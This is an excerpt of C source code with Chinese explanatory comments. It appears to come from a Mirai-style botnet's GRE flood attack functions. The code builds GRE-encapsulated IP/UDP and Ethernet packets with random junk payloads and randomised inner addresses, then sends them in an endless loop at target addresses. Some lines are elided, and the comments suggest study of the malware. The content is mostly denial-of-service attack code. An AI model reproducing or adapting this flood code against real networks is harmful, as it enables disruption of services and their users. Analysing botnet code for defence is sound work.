...
void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);  //512字节的随机payload
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len); //len字段加入了两个IP头部size
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;   //GRE协议中规定的IP头，标识内部这里的IP头内是GRE的头
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;  //外部ip用于tunnel中标识传输到的另一端，这个就是be attacked的target。不可随机化。

        // GRE header init
        greh->protocol = htons(ETH_P_IP); // Protocol is 2 bytes【负载的包的类型】
        ...
        greiph->protocol = IPPROTO_UDP;  //真实的被封装的ip头。标识是UDP协议
    ...
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            ...
            if (!gcip)
                greiph->daddr = rand_next(); //被封装的ip头可以是随机的。被封装的所有payload都是junk
            else
                greiph->daddr = iph->daddr;
...
void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        ethh->h_proto = htons(ETH_P_IP);  //内部负载了eth包

        // Encapsulated IP header init
        greiph->version = 4;    //然后是ip头，然后是udp头，然后是上层应用数据包。
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
